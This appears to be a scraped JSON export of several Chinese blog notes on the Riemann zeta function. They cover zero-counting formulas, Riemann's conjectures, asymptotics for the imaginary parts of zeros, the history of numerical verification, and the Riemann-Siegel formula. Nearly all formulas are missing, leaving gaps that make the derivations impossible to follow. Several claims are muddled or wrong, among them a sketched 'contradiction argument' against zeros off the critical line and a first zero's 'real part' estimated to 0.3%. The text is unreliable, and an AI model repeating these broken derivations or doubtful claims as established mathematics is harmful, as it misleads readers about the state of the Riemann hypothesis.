函数的零点分布关联起来。他发现 的解析表达式中包含 函数非平凡零点的无穷和，这促使他系统研究 在复平面的性质。通过对 函数进行解析延拓，黎曼证明其仅在 处有平凡零点，而所有非平凡零点均位于临界带 内。 ξ 函数的引入与对称性为简化零点分析，黎曼定义了辅助函数 ： 该函数具有三个关键性质：整函数性（全平面解析）、对称性 （关于临界线 对称），以及零点与 非平凡零点完全重合。对称性意味着零点要么位于临界线上，要么成对关于临界线对称，这为后续计数公式奠定了基础。 渐近公式的严格推导1. 对数留数与矩形围道积分为计算 （虚部 的非平凡零点个数），黎曼采用复分析中的对数留数定理：函数在闭曲线内的零点个数等于其对数导数沿曲线的积分除以 。构造矩形围道 ，顶点为 ，包围临界带内所有虚部小于 的零点。 根据留数定理： 零点个数极点个数 由于 是整函数（无极点），积分结果即为围道内零点总数。利用对称性 ，可将左侧积分分解为右半围道 （ 到 ）与左半围道 （ 到 ），且两者贡献相等，从而得到： 其中 来自围道拐角处的误差项。 2. Γ 函数对数导数的渐近展开对 取对数并求导，得到： 关键在于估算 函数对数导数 的渐近行为。利用 Stirling 公式 （ ），取对数后求导得： 代入 ，分离实部虚部后，虚部贡献主导项为 （ 时）。 3. 积分估算与主项提取将 沿右半围道 （实部从 2 到 1 / 2，虚部固定为 ）积分，逐项分析： 积分贡献 （有界函数）； 积分贡献 ，但符号与 项抵消后可忽略； 沿 衰减极快（因 在此区域绝对收敛），积分贡献 ； 主导项来自 函数对数导数，其积分结果为： 综合所有项，最终得到渐近公式： 其中 为误差项，Littlewood 证明其有界 ，当 时可忽略。 Riemann-von Mangoldt 公式： 公式的意义与后续发展黎曼的零点计数公式不仅定量描述了零点的平均密度（约 ），更暗示了素数分布的深层规律，素数定理可由 的渐近行为直接推导。1905 年，von Mangoldt 首次严格证明了该公式，填补了黎曼推理中的关键步骤；后续研究（如 Riemann-Siegel 公式）进一步将误差项精确到 ，为数值计算零点提供了工具。 值得注意的是，公式中 项与热力学熵的对数形式相似，这启发了后续将零点分布与量子混沌、随机矩阵理论关联的跨学科研究。 结语：未完成的交响曲黎曼的零点计数公式犹如一部未完成的交响曲，其主体旋律（渐近主项）已被完美演绎，但细节（误差项的精细结构、所有零点是否位于临界线）仍悬而未决。从 Hardy 证明无穷多零点在临界线上，到 Conrey 证明至少 40% 零点位于临界线，每一步进展都依赖于对 对称性与解析性质的更深理解。正如黎曼在论文中谨慎指出的：“极有可能所有的根都是实数”，这一猜想至今仍是数学界最璀璨的明珠之一，等待着最终的证明。"},{"title":"","date":"2025-09-14T05:24:00.000Z","updated":"2025-09-14T05:42:00.000Z","comments":true,"path":"notes/Zeta/6.html","permalink":"https://blog.mhuig.top/notes/Zeta/6","excerpt":"","text":"Ueber die Anzahl der Primzahlen unter einer gegebenen Grösse Ueber die Anzahl der Primzahlen unter einer gegebenen Grösse"},{"title":"","date":"2025-10-16T02:20:00.000Z","updated":"2025-10-16T02:55:00.000Z","comments":true,"path":"notes/Zeta/56.html","permalink":"https://blog.mhuig.top/notes/Zeta/56","excerpt":"","text":"黎曼关于 Zeta 函数零点分布的三个核心论断 黎曼关于 Zeta 函数零点分布的三个核心论断 1859 年，波恩哈德・黎曼在《论小于给定数值的素数个数》中，通过对 ζ 函数的创新性研究，揭示了素数分布与复平面零点之间的深刻联系。这篇开创性文献不仅奠定了解析数论的基础，更提出了三个关于 ζ 函数零点分布的核心论断，其中最著名的 “黎曼猜想” 至今仍是数学界悬而未决的巅峰难题。这里将系统梳理这些论断的历史背景、数学表述及解析推导，揭示其内在逻辑与深远影响。 如果我们使用随意一点的口语而不是正式的书面语言来表达这三个论断，那么： 论断一：（陈述事实的语气）显然，所有非平凡零点都被限定在 0 到 1 之间的临界带内。 论断二：（肯定的语气）几乎所有的非平凡零点，实部都恰好等于 1 / 2。 论断三：（推测的语气） 很有可能所有的非平凡零点其实都整齐地排列在实部为 1 / 2 的临界线上。 历史背景ζ 函数的起源可追溯至 1737 年欧拉的工作，他证明了对实部大于 1 的实数 ，有： 这一乘积公式首次将素数分布与解析函数关联起来。但欧拉未能突破实数域的局限，而黎曼在 1859 年的论文中实现了革命性跨越：他通过解析延拓将 ζ 函数定义域扩展到整个复平面（除 处的单极点外），并发现其零点分布与素数计数函数 的精确表达式密切相关。 黎曼的关键洞察是引入辅助函数 以简化零点分析： 该函数具有三个核心性质： ① 整函数（无极点）； ② 零点与 ζ 函数的非平凡零点完全一致； ③ 满足对称性 。 这一对称性暗示零点关于临界线 对称分布，构成了三个论断的共同基础。 核心论断一：非平凡零点的存在范围与对称性命题一在 范围内 的零点数目约为 。 论断表述黎曼首先断言：ζ 函数的所有非平凡零点均位于临界带 内，且若 是零点，则 也是零点。 解析推导 平凡零点排除： 通过函数方程 可见当 （ 为正整数）时， 但这些是 函数极点的产物，被 中的 项抵消，故非平凡零点只能位于临界带内。 对称性证明： 对 应用 函数的余元公式 可得： 结合 ζ 函数方程，可验证 ，从而零点关于 对称。 零点无界性： 黎曼通过对 的 Hadamard 乘积展开 （其中 遍历非平凡零点），证明零点有无穷多个。后续的 Riemann-von Mangoldt 公式进一步给出零点计数函数的渐近表达式： 表明当 时，高度 以下的零点数量趋于无穷。 核心论断二：临界线上零点的无穷性与密度估计命题二在 范围内 的位于 的直线上的零点数目也约为 。 论断表述黎曼在论文中暗示（并通过数值计算验证）：临界线 上存在无穷多个零点，且这些零点的分布密度可能与 相关。 关键进展与证明 Hardy 的突破（1914）: 首次严格证明临界线上有无穷多零点，其证明基于对 的积分估计，核心思路是构造辅助函数： 其中 证明 有无穷多个实零点。 Selberg 的密度定理（1942）： 证明临界线上零点占比为正，即存在常数 使得： 其中 为临界线上高度 以下的零点数。中国数学家闵嗣鹤于 1956 年将比例下界改进为 ，目前最佳结果是 Conrey 证明的 。 数值验证： 截至 2004 年，Gourdon 已验证前 个零点均位于临界线上，Odlyzko 对高高度零点的计算进一步支持了零点分布的统计规律。 核心论断三：黎曼猜想 - 所有非平凡零点位于临界线猜想表述黎曼的终极断言（黎曼猜想）： 函数的所有非平凡零点均位于满足 的直线上。 解析思路与部分结果虽然猜想尚未完全证明，但通过 函数的性质可构建以下论证框架： 函数的实值性：当 时， 为实函数，故其零点对应实轴交点，可通过符号变化判定。黎曼本人计算了前几个零点的数值，发现均位于临界线上。 临界带内零点排除：假设存在非临界线零点 （ ），则由 的解析性，其在临界带内的曲线族 （ ）应形成连续像集。但通过构造矩形围道并应用幅角原理，可证明此类零点会导致矛盾： 导数估计：在紧致区域 内， ，相邻曲线差异随 趋于零； 指数衰减：当 时， ，指数项主导使得非临界线不可能存在零点。 反证法框架： 假设存在 的零点 ； 由对称性知 也是零点，构造零点序列 满足 ； 但 Conrey 定理表明在 内无零点，与序列构造矛盾。 影响与意义：数学大厦的基石猜想黎曼的三个论断构成了解析数论的支柱。第一个论断确立了零点的基本分布范围，第二个揭示了临界线的特殊地位，第三个则是数论中最深刻的未解之谜。若黎曼猜想成立，将直接改进素数定理的误差项：从 提升至 ，并蕴含数千个数论命题的正确性。 从希尔伯特将其列为 23 个问题之八，到克雷数学研究所将其列为千禧难题，黎曼猜想的魅力不仅在于其简洁表述，更在于它连接了数论、复分析与几何学的深层结构。它的证明将照亮素数分布的终极规律，揭示数学宇宙的内在和谐。 结语：未竟的探索黎曼在 1859 年论文中谨慎地写道：“当然，人们希望能找到这一结论的严谨证明，但我经过几次短暂而徒劳的尝试后已经放弃了寻找这种证明的努力，因为这对于我当前的研究目标来说并非必要”。一个半世纪后的今天，尽管我们已积累了海量的数值证据和部分结果，却仍未触及猜想的核心。或许正如黎曼所预见的，完整证明需要全新的数学思想，这种思想可能藏在 函数的周期性、零点的统计规律或某种未被发现的对称性中，等待着下一次数学革命的到来。当我们凝视临界线上无穷多个跳动的零点时，看到的不仅是素数的音乐，更是人类理性面对未知时永恒的探索精神。"},{"title":"","date":"2025-10-18T06:20:00.000Z","updated":"2025-10-18T06:55:00.000Z","comments":true,"path":"notes/Zeta/60.html","permalink":"https://blog.mhuig.top/notes/Zeta/60","excerpt":"","text":"Zeta 非平凡零点虚部渐近公式 Zeta 非平凡零点虚部渐近公式 黎曼 函数非平凡零点的虚部分布是解析数论的核心课题，其渐近规律不仅揭示了素数分布的深层结构，更与黎曼假设（RH）的真伪紧密相连。虚部渐近公式的历史演进，从黎曼原始猜想出发，通过黎曼 - 冯・曼戈尔特公式建立零点计数函数与虚部的关联，最终推导出基于朗伯函数的显式近似表达式，并分析其在极端大尺度下的精度表现。这些公式的每一步推导都交织着复分析技巧与数论直觉，构成了理解临界线神秘零点的关键框架。 历史背景与临界带约束1859 年，黎曼在其开创性论文中首次预言：ζ 函数的非平凡零点（即满足 且 的复根）可能全部位于临界线 上。这一猜想至今悬而未决，但其蕴含的零点分布规律已通过数值计算与理论分析逐步揭示。对于虚部 （约定 且按递增顺序排列），早期研究主要关注临界带内的非存在性证明，当 且 时，完成 ζ 函数满足指数衰减估计： 其中 为常数。这一结果表明在临界线外 ，ξ 函数的模随 增长而趋于零，从而不可能存在零点，为后续集中研究临界线上的虚部分布奠定了基础。 零点计数函数与黎曼 - 冯・曼戈尔特公式虚部渐近公式的推导始于零点计数函数 的精确表达式，定义为临界线上满足 的非平凡零点个数。黎曼最初猜想 而冯・曼戈尔特在 1905 年严格证明了完整的渐近公式： 其中 为 Siegel 函数，其模长满足 。这一公式揭示了零点分布的宏观规律：当 时，零点密度与 成正比，即相邻零点的平均间距约为 。 对 进行反演是获取 渐近行为的关键。若忽略次要项 与常数项，近似有 令 （假设零点简单且无重根），可得关于 的超越方程： 这一方程最早由 LeClair 通过数值实验验证，其精度随 增大而提高。 基于朗伯函数的显式渐近公式上述超越方程的解析求解依赖朗伯 W 函数，定义为 的多值反函数。令 ，则方程可改写为： 两边取指数得 ，即 。应用朗伯 W 函数的主分支 ，解得： 当 时，自变量 ，此时朗伯函数满足渐近展开 。代入可得： 经指数化与整理，最终得到虚部的首项渐近公式： 更精确的表达式需包含高阶修正项。LeClair 通过数值拟合得到： 其中 为朗伯函数的主分支。这一公式对极端大 （如 ）仍能保持小数点后三位的精度，展示了其强大的预测能力。 误差分析与数值验证朗伯函数近似的误差来源主要包括： Siegel 项修正： 带来的随机波动，其均方根误差为 高阶渐近项：黎曼 - 冯・曼戈尔特公式中的 项及朗伯函数展开的次要项 零点间距涨落：相邻零点间距的统计分布符合随机矩阵理论预测，存在局部偏差 数值验证表明，当 时，朗伯函数近似的绝对误差小于 0.1；而对 ，误差已降至 量级。这一精度特性使得该公式成为计算超大序号零点的高效工具。例如，通过快速收敛的朗伯函数算法，可在秒级时间内估算出 对应的虚部： 这一结果与直接数值积分相比，计算复杂度从 降至 ，体现了解析渐近公式的不可替代性。 前沿挑战与未解决问题尽管朗伯函数近似取得了巨大成功，虚部渐近行为仍存在诸多深刻问题： 误差项的解析表示：目前仅知 但具体系数尚未确定，非平凡零点虚部的精确解析公式仍是未解之谜 零点对关联：相邻零点间距 的渐近分布是否满足普适性统计规律，仍需更多理论支持 RH 对渐近公式的影响：若 RH 不成立，临界带内的非平凡零点将如何修正现有渐近行为？研究表明，对 ， 的指数衰减特性可能排除此类零点的存在性，但严格证明仍缺失。 这些问题的解决不仅依赖复分析与数论的深度融合，更可能需要随机矩阵理论、动力系统等交叉学科的新方法。正如黎曼 ζ 函数将素数分布与复平面零点联系起来，虚部渐近公式的精细结构或许正隐藏着通往黎曼假设证明的关键线索。 当我们凝视公式 中简洁的对数项时，是否能感受到素数在复平面上投下的神秘阴影？这个将离散序号 与连续虚部 编织在一起的数学表达式，既是人类理性思维的辉煌成就，也是向未知领域发出的永恒追问。"},{"title":"","date":"2025-10-18T08:20:00.000Z","updated":"2025-10-18T08:55:00.000Z","comments":true,"path":"notes/Zeta/61.html","permalink":"https://blog.mhuig.top/notes/Zeta/61","excerpt":"","text":"黎曼 Zeta 函数非平凡零点虚部研究的历史脉络 黎曼 Zeta 函数非平凡零点虚部研究的历史脉络 自 1859 年黎曼提出关于 函数非平凡零点的猜想以来，这些复数零点的虚部特征始终是数学界的核心谜题。这些零点不仅决定着素数分布的精细结构，通过黎曼 - 冯・曼戈尔特公式直接关联到素数计数函数的误差项，其虚部的统计规律更意外地与量子物理中的能级分布产生深刻联系，成为连接纯粹数学与理论物理的桥梁。这里将系统梳理非平凡零点虚部研究的百年历程，从黎曼的原始洞察到当代数值验证的突破，揭示这一问题如何持续挑战人类智力的极限。 历史起源：黎曼的开创性贡献黎曼的天才之处在于将欧拉时代的实变量 函数拓展至整个复平面。对实数 ，欧拉 函数定义为 ，但这一级数在 时发散。通过复变函数论中的解析延拓技术，黎曼证明存在唯一的全纯函数（除 处的单极点外）在 区域与欧拉级数一致，这就是黎曼 函数。其核心突破在于发现该函数满足深刻的函数方程： 这一方程揭示了 函数零点的对称性：若 是零点，则 也是零点。黎曼注意到负偶数 是显然的零点（后世称为平凡零点），而所有非平凡零点（即位于临界带 内的零点）应关于直线 对称分布。基于对前几个零点的数值计算（他手工计算了 等虚部值），黎曼大胆猜测： 所有非平凡零点的实部均为 ，即它们都位于复平面上的临界线 （ ）上。 为将这一猜想与素数分布关联，黎曼引入了阶梯函数 （其中 为素数， ），并证明了里程碑式的积分表示： 这里 是对数积分函数，而求和遍历所有非平凡零点 。这一公式首次将素数分布与复平面上的零点位置直接绑定，其中每个零点 贡献的项 会产生周期性波动，其频率由虚部 决定。因此，非平凡零点虚部的大小和分布直接控制着素数在数轴上的疏密变化。 黎曼的原始论文仅 8 页却蕴含惊人的洞察力，但他未能提供严格证明。事实上，他在论文中坦言：\"当然，人们希望能找到这一结论的严谨证明，但我经过几次短暂而徒劳的尝试后已经放弃了寻找这种证明的努力，因为这对于我当前的研究目标来说并非必要\"。这一搁置开启了数学史上最漫长的探索之一。 早期进展：从手工计算到复分析突破（1859-1940）黎曼猜想提出后的三十余年间，数学界对非平凡零点的研究进展缓慢。直到 1896 年，阿达马和瓦莱 - 普桑分别独立证明了 ，从而确立了素数定理 。但关于临界线的突破则要等到 20 世纪初。 零点计算的手工时代1903 年，丹麦数学家格拉姆（J.P. Gram）开创了系统计算非平凡零点的先河。他利用黎曼 - 西格尔公式的前身，将临界线上的 函数值表示为快速收敛的级数：对 ， 函数可分解为： 误差项 通过计算前 15 个零点的虚部（其中第一个零点的虚部 被称为格拉姆点），格拉姆验证了黎曼猜想对这些零点成立。这一工作的关键意义在于建立了 \"零点计数\" 的范式：通过追踪 的符号变化来定位零点，并结合函数的解析性质确保没有遗漏。 1914 年，英国数学家哈代（G.H. Hardy）取得理论突破，证明存在无穷多个非平凡零点位于临界线上。他的证明基于对 函数在临界线上的积分表示，通过构造特定的整函数并应用刘维尔定理完成反证。虽然未能给出零点的具体分布密度，但这一结果粉碎了 \"临界线上只有有限个零点\" 的悲观猜测，为后续研究注入强心剂。 西格尔的历史性发现黎曼原始论文中有一处神秘的 \" 函数 \" 记法，其具体形式在他去世后半个世纪才被解密。1932 年，德国数学家西格尔（Carl Ludwig Siegel）重新研究黎曼遗留的手稿，发现黎曼实际上已发展出计算临界线 函数值的高效算法，即后世所称的黎曼 - 西格尔公式。这一公式将 表示为有限和与积分余项之和： 其中 是哈代引入的实值函数（满足 ， 为黎曼 - 西格尔 theta 函数），而余项 可被严格控制。这一公式的发现使零点计算效率提升了数个量级，1935 年英国数学家蒂奇马什（E.C. Titchmarsh）借助该公式将验证推进到第 1041 个零点，所有这些零点的虚部均满足 的形式。 数值验证的黄金时代：从计算机到 10 万亿个零点二战后，电子计算机的出现彻底改变了零点计算的格局。1953 年，图灵（Alan Turing）在曼彻斯特大学的 Ferranti Mark I 计算机上实现了首个自动零点验证程序，他创新性地结合黎曼 - 西格尔公式与零点计数函数 （表示虚部 的非平凡零点总数）的估计，发展出 \"封口\" 技术确保区间内没有漏检零点。图灵的方法基于冯・曼戈尔特证明的渐近公式： 其中 是误差项，与 函数零点的分布密切相关。通过比较数值找到的零点个数与 的理论预测，图灵证明了前 1104 个零点均位于临界线上。 算法与硬件的协同进化1960 - 1980 年代见证了零点计算的爆发式增长。1968 年，Rosser 等人使用 IBM 7090 计算机验证了前 350 万个零点；1979 年，Brent 将这一数字推至 8100 万；1986 年，van de Lune 团队在 Cray X - MP 超级计算机上完成了对前 15 亿个零点的验证。这些进展不仅依赖硬件性能的提升，更关键的算法突破包括： 快速傅里叶变换（FFT）加速：将黎曼 - 西格尔公式中的求和转化为卷积运算，使计算复杂度从 降至 区间算术验证：使用严格的浮点计算技术确保不会因舍入误差错过零点 分布式计算：1990 年代后，Wedeniwski 发起的 ZetaGrid 项目利用全球志愿计算资源，2004 年将连续验证推进到前 10 万亿（ ）个零点 这些超大规模计算产生了一个惊人发现： 非平凡零点虚部的间距分布与高斯酉随机矩阵（GUE）特征值的间距分布高度吻合。Odlyzko 对第 个零点附近数十亿个零点的统计分析表明，其局部统计规律与量子混沌系统的能级分布满足相同的普适定律，这一现象至今缺乏理论解释，却成为希尔伯特 - 波利亚猜想（猜测存在自伴算子其谱等价于零点虚部）的最强实验证据。 当代验证的极限截至 2023 年，最新记录由 Platt 和 Trudgian 保持，他们使用改进的 Turing 方法与区间算术，严格证明了虚部 范围内的所有零点均位于临界线上。值得注意的是，这些计算不仅验证了黎曼猜想的正确性，更产生了海量的虚部数据，为研究零点的统计性质提供了实验基础。例如，前 10 万亿个零点的虚部满足： 无理性：所有已计算的虚部均为无理数，且似乎不满足任何代数关系 分布密度：虚部随 增大而变得稀疏，平均间距约为 随机性：虚部的小数部分在 区间内均匀分布，支持其 \"随机性\" 的直觉 理论突破：临界线上零点的密度估计尽管数值验证取得巨大成功，理论上证明 \"几乎所有\" 或 \"正比例\" 的非平凡零点位于临界线上却异常困难。这一方向的首个突破来自 1942 年塞尔伯格（Atle Selberg），他证明了存在常数 ，使得当 时，临界线上虚部 的零点个数至少为 。这一结果虽然未给出具体比例，却首次确立了临界线上零点的 \"丰度\"。 比例定理的演进1974 年，美国数学家莱文森（Norman Levinson）引入创新的 \"双零点\" 方法，通过研究 函数及其导数的零点关联，证明了至少 的非平凡零点位于临界线上。其核心思想是构造辅助函数 ，利用其在临界线附近的模估计得到零点计数的不等式。1989 年，康瑞（Brian Conrey）改进了这一方法，将比例下界提升至 。 2024 年，Guth 和 Maynard 在零点密度估计方面取得重要进展，他们改进了 Ingham 在 1940 年提出的经典零点密度定理。对于 ，令 表示 且 的非平凡零点个数。Ingham 证明了 ，而 Guth - Maynard 将指数从 （0.6）降至 （0.52）。这一改进虽未直接证明更多零点位于临界线，却显著提升了我们对零点在临界带内分布的控制，为解析数论中的许多应用（如短区间素数定理）提供了更强的工具。 函数方程与对称性的深层应用研究非平凡零点虚部的另一重要途径是通过 函数，这是黎曼为简化零点分析引入的整函数： 函数具有完美的对称性 ，且其零点与 函数的非平凡零点完全一致。在临界线上， 为实值函数，因此其零点对应于该实函数的符号变化点，这一性质极大简化了数值搜索。在 2025 年的最新研究中利用 函数的渐近展开： 证明了当 充分大且 （ ）时， 函数的模有严格正下界，从而排除了远离临界线处零点的存在性。这一结果虽未证明黎曼猜想，却为零点虚部的大小提供了定量控制。 未解决的核心问题与哲学思考历经 160 余年研究，黎曼猜想仍屹立不倒，其困难程度远超黎曼最初的预期。从数学角度看，非平凡零点虚部研究面临的核心挑战包括： 整体性与局部性的矛盾： 函数的零点是整体定义的对象，但其虚部的局部行为却表现出随机性，如何调和这两种特性？ 分析与代数的鸿沟：现有方法高度依赖复分析技巧（如模估计、积分表示），缺乏代数几何或数论几何的全新视角 物理直觉的数学化：零点虚部与量子混沌的关联暗示可能存在深刻的算子理论解释，但希尔伯特 - 波利亚猜想（猜测存在自伴算子其特征值为零点虚部）至今未被证实 从哲学层面看，黎曼猜想的研究史揭示了数学真理的双重性：一方面，前 10 万亿个零点的数值证据压倒性地支持猜想成立；另一方面，数学真理不能仅靠归纳确立，哥德尔不完备定理提醒我们，某些命题可能在现有公理体系内无法判定。黎曼猜想的困难之处在于，它处于纯粹分析与算术之间的无人地带，需要同时掌握两门学科的最深层工具。 未来的突破可能来自意想不到的方向，或许是 Langlands 纲领的某种变形，或许是量子场论中的新方法，甚至可能需要创造全新的数学分支。无论结果如何，对非平凡零点虚部的探索已经并将继续深刻改变人类对数学本质的理解，这些研究将把我们引向一些全新的数学领域。 黎曼猜想漫谈"},{"title":"","date":"2025-10-18T10:20:00.000Z","updated":"2025-10-18T10:55:00.000Z","comments":true,"path":"notes/Zeta/62.html","permalink":"https://blog.mhuig.top/notes/Zeta/62","excerpt":"","text":"黎曼 Zeta 函数非平凡零点虚部的表达式 黎曼 Zeta 函数非平凡零点虚部的表达式 背景与历史渊源黎曼 Zeta 函数 的非平凡零点虚部表达式的研究贯穿了超过一个半世纪的数学史。1859 年，伯恩哈德・黎曼首次系统性地研究了 函数的零点性质。他通过构造辅助函数 揭示了深刻的对称性 ，这一发现直接暗示非平凡零点应关于临界线 对称分布。 黎曼敏锐地观察到，所有非平凡零点可能都位于临界线上，并给出了零点计数的渐近估计公式。1905 年，曼戈尔特（von Mangoldt）严格证明了黎曼提出的零点计数公式，揭示了零点虚部 的分布规律。 20 世纪以来，随着复分析技术和计算数学的发展，数学家们对零点虚部的解析表达式进行了深入研究。塞尔伯格（Selberg）在 1940 年代建立了 函数零点分布的更精确理论，而蒙特戈马利（Montgomery）在 1970 年代提出的 \"对关联猜想\" 将零点虚部的分布与随机矩阵理论联系起来，开辟了新的研究方向。 非平凡零点的严格数学定义黎曼 Zeta 函数的解析延拓黎曼 Zeta 函数最初定义为狄利克雷级数： 通过解析延拓， 可定义为全复平面上的亚纯函数，仅在 处有单极点。延拓后的函数满足函数方程： 非平凡零点的特征 函数的零点分为两类：平凡零点位于负偶数点 ，而非平凡零点则位于临界带 内。根据函数方程，若 是非平凡零点，则 也是零点。 黎曼假设断言所有非平凡零点都满足 ，即位于临界线上。因此，零点可表示为 ，其中 为零点的虚部。 零点计数函数定义 为虚部在区间 内的非平凡零点个数（计入重数）。曼戈尔特 - 黎曼公式给出： 其中 称为黎曼 - 西格尔函数，表示 函数在临界线上的辐角变化； 是修正项，满足 。 零点虚部表达式的详细推导渐近展开方法对于按虚部递增排列的第 个非平凡零点 ，其虚部 的渐近行为可通过反演计数函数 得到。当 充分大时，有 。 代入 的主项近似： 这是一个超越方程，可通过迭代法求解。令 ，则方程变为： 逐步迭代可得主渐近公式： 为了获得更精确的表达式，需要考虑 中的对数项。设 ，代入 的完整表达式： 经过详细计算，可得一阶修正公式： 黎曼 - 西格尔公式推导黎曼 - 西格尔公式提供了计算 函数在临界线上值的有效方法，从而可用于精确确定零点位置。公式基于 函数的积分表示： 其中 是雅可比 theta 函数的导数。 通过渐进展开和鞍点方法，黎曼 - 西格尔公式将 表示为有限和加余项的形式： 其中 ，余项 可精确估计。 零点条件 转化为求解超越方程： 该方程可通过数值方法（如牛顿迭代法）求解，得到零点虚部 的精确值。 基于递推关系的构造方法Artur Kawalec 在 2022 年的研究中提出，假设黎曼假设成立，可通过 次级 Zeta 函数族的封闭形式表示 构建非平凡零点的递推公式 …。该公式需依赖前 个零点的信息来生成第 个零点，形式如下： 此公式通过对数导数和根提取法从 Zeta 函数的 Weierstrass 乘积展开中推导而来，数值验证显示其对前几个零点的逼近精度可达小数点后 13 位。递推过程中需逐步去除已发现零点的贡献，且随着 增大需提高参数 以维持精度。 与素数分布的关联公式Kawalec 还发现非平凡零点与素数之间存在双向映射关系：所有素数可转化为单个非平凡零点，反之亦然 … 。尽管具体转换公式涉及复杂的级数展开，但其核心思想是通过 Zeta 函数的欧拉乘积与零点的 Hadamard 乘积之间的等价性建立联系。例如，第 个零点的虚部 可通过对素数序列的某种加权求和近似，但该过程需数值迭代实现。 积分方程方法近年来，研究人员发现了非平凡零点满足的积分方程。对于 ，有： 其中 表示 的分数部分。 将实部和虚部分离，可得关于 的实积分方程： 这一方程虽然复杂，但为理论研究提供了新视角。该方程将零点与积分变换的特征值问题关联，提供了零点存在性的另一种刻画方式。该积分方程对所有非平凡零点均成立，无论黎曼假设是否为真，这为零点研究提供了新的约束条件。 ... 推导过程 从原始定义到积分表示 当 时，ζ 函数定义为 利用黎曼 - 斯蒂尔切斯积分，可将部分和表示为： 其中 为取整函数。通过分部积分（设 ， ），得： 由于 ，当 时， （因 ），故： 分离整数部分与小数部分 对任意实数 ，有 ，其中 为小数部分函数（ ）。代入上式得： 计算第一项积分： 代入后整理得： 收敛域的拓展 上式的核心在于积分项 的收敛性。由于 ，被积函数满足 ，而积分 当 时收敛（ ）。因此，通过解析延拓，上式的收敛域可从 拓展至 且 。收敛域分析原始定义的收敛域：ζ 函数的级数定义域 仅在 收敛。 积分表示的收敛域：积分项的收敛依赖于 ，而 在 处有单极点（与 ζ 函数的奇点一致）。因此，最终结果的收敛域为 且 ζ(s) 的积分表达式已知当 时，黎曼 ζ 函数可表示为：其中 为小数部分函数， 为取整函数。对 ζ(s) 进行解析延拓为处理 ζ(s) 的非平凡零点 （满足 ），需将式 延拓到全复平面。利用 ，可将式 改写为：进一步拆分积分区间并引入变量替换 （中心平移以对称化小数部分），得到：代入非平凡零点条件设 为 ζ(s) 的非平凡零点（即 ），代入式 得：整理后得到：拆分积分并引入对称化小数部分将积分区间 拆分为 和 ，并对后者作变量替换 ，得到：注意到 在平移后具有对称性，可表示为 （当 时）。代入式 并合并同类项：计算积分并整理等式计算式 中第一项积分：将式 代入式 ，再结合式 的 ，得到：两边同乘 并移项，最终得到：关键结论通过解析延拓和对称化处理，成功将 ζ(s) 的积分表达式与非平凡零点 关联，最终推导出：该等式揭示了黎曼 ζ 函数零点与小数部分函数积分的深层联系，为研究零点分布提供了积分形式的约束条件。 虚部分布的特殊性质与统计规律对关联猜想与随机矩阵理论蒙特戈马利对关联猜想指出，非平凡零点虚部的归一化间距分布与高斯幺正系综（GUE）的特征值间距分布一致。定义归一化间距为： 则对关联函数满足： 这一深刻联系表明素数分布与量子混沌系统之间存在内在关联。 零点虚部的矩估计零点虚部的 阶矩定义为： 研究表明，矩的增长服从特定规律： 其中常数 与随机矩阵理论中的相应矩有关。 应用与计算方法在素数分布中的应用零点虚部表达式在素数定理的余项估计中起关键作用。在黎曼假设成立的条件下，素数计数函数 的误差项可表示为： 其中求和遍及所有非平凡零点 。虚部 的大小决定了相应项对误差的贡献程度，前几个零点（虚部最小的零点）对素数分布的影响最为显著。 数值计算方法现代零点计算主要基于以下技术： 黎曼 - 西格尔公式：用于高效计算 函数在临界线上的值 奥德利兹克算法：利用快速傅里叶变换提高计算效率 戈尔德斯顿 - 施密特方法：基于差分方程的数值技术 当前计算已验证超过 个零点位于临界线上，但黎曼假设的一般性证明仍遥不可及。 理论物理学中的出现零点虚部分布规律在量子混沌、弦理论等物理领域也有重要应用。特别是， 的统计性质与某些量子系统的能级间距分布惊人相似，这为数学与物理的交叉研究提供了丰富素材。 前沿进展与开放问题近年来，研究人员在零点虚部研究方面取得了若干进展： 渐近公式的改进：Conrey、Ghosh 等人获得了 更精确的渐近展开式 局部统计学：Rudnick-Sarnak 理论研究了高维 函数零点虚部的普遍性 计算验证：Gourdon-Demichel 通过分布式计算将零点验证推进到新的高度 然而，以下核心问题仍然开放： 黎曼假设的证明或证伪 函数的最佳上界估计 零点虚部与特定数学常数（如 、 ）的算术关系 虚部分布在高维 函数中的普遍性原理 零点虚部表达式的研究不仅是解析数论的核心课题，也深刻影响着现代数学的发展方向。如果我们能理解 函数零点的奥秘，就将揭开素数分布的最深层次规律。"},{"title":"","date":"2025-10-18T10:20:00.000Z","updated":"2025-10-18T10:55:00.000Z","comments":true,"path":"notes/Zeta/63.html","permalink":"https://blog.mhuig.top/notes/Zeta/63","excerpt":"","text":"黎曼 - 西格尔公式 黎曼 - 西格尔公式 1859 年，黎曼在其划时代论文《论小于给定数值的素数个数》中埋下了一颗数学种子，一个未被证明却暗示着 函数深层结构的渐近展开式。这颗种子在黎曼去世 70 年后，由西格尔从哥廷根大学图书馆的遗稿中发掘，最终绽放为现代解析数论的核心工具：黎曼 - 西格尔公式。这一公式不仅揭示了 函数在临界线 上的精细行为，更成为计算非平凡零点、验证黎曼猜想的数值实验基础。其发现过程本身就是一段跨越世纪的数学传承，黎曼凭借直觉写下关键步骤，西格尔则以考古学家般的耐心重构证明细节，而哈代、利特尔伍德等后人又在此基础上发展出近似函数方程理论。 历史背景：从黎曼遗稿到西格尔的突破黎曼在 1859 年写给魏尔斯特拉斯的信中曾提及 \" 一种对 函数的新发展 \"，但因\" 尚未简化到足以发表 \" 而搁置。这份未完成的工作随着黎曼 1866 年去世被尘封，直到 1920 年代，西格尔在审查黎曼手稿时，发现了一组涉及特殊积分 的计算笔记。这些笔记显示，黎曼已掌握一种计算 在临界线上渐近展开的方法，其精度远超当时学术界的认知，他甚至通过该方法手动计算出前几个非平凡零点，其中第一个零点的实部估值为 ，与现代计算的 仅相差千分之三。 西格尔的关键贡献在于，他将黎曼零散的笔记系统化，严格证明了这一展开式的收敛性并给出余项估计。1932 年发表的论文《论黎曼解析数论遗稿》中，西格尔指出黎曼的方法基于一个核心积分： 这一积分具有深刻的数论意义，后来被克罗内克和莫德尔用于推导高斯和互反公式的最简证明。值得注意的是，当西格尔完成这项工作时，纳粹已开始掌权，哥廷根学派的黄金时代行将结束，这篇论文因此被视为 \"欧陆古典分析的最后余晖\"。 数学基础：黎曼 函数与 函数的积分表示 函数的基本性质黎曼 - 西格尔公式的起点是一个特殊的积分变换。定义 黎曼 函数 为复平面上的路径积分： 其中积分路径 表示从第四象限到第二象限、斜率为 且穿过实轴 区间的直线。这一奇特路径选择并非偶然 —— 它使得积分能够同时避开被积函数的极点（位于整数点 ）并捕捉到复平面上的指数衰减行为。 通过柯西定理和路径变形，黎曼导出了 的两个关键差分方程： 